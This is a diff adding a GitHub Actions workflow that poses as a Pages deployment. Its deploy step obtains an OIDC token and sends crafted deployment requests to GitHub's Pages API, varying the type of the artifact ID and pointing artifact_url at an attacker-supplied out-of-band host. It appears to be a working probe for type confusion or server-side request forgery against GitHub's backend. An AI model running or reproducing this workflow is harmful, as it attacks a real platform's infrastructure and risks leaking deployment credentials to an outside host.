@@ -1,0 +1,44 @@
+name: pgdep3
+on:
+  workflow_dispatch:
+    inputs:
+      oob:
+        required: true
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+  actions: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir -p _site && echo "<h1>pgdep3</h1>" > _site/index.html
+      - uses: actions/upload-pages-artifact@v3
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+    steps:
+      - name: typeconf
+        env:
+          OOB: ${{ github.event.inputs.oob }}
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          echo "::add-mask::$TOKEN"
+          ART=$(curl -s -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" | jq -r '.artifacts[] | select(.name=="github-pages") | .id')
+          echo "artifact_id = $ART"
+          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
+          post(){ echo "===== ARM $1 : artifact_id=$2 ====="; \
+            curl -s -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API" \
+            -d "{\"artifact_id\":$2,\"artifact_url\":\"https://$OOB/_apis/pipelines/1/runs/1/artifacts?arm=$1\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"; }
+          post FLOAT "$ART.0"
+          sleep 40
+          post SCI "$(python3 -c "print('%e' % $ART)")"
+          sleep 40
+          post STRING "\\\"$ART\\\""
+          sleep 40
+          post INTCTL "$ART"
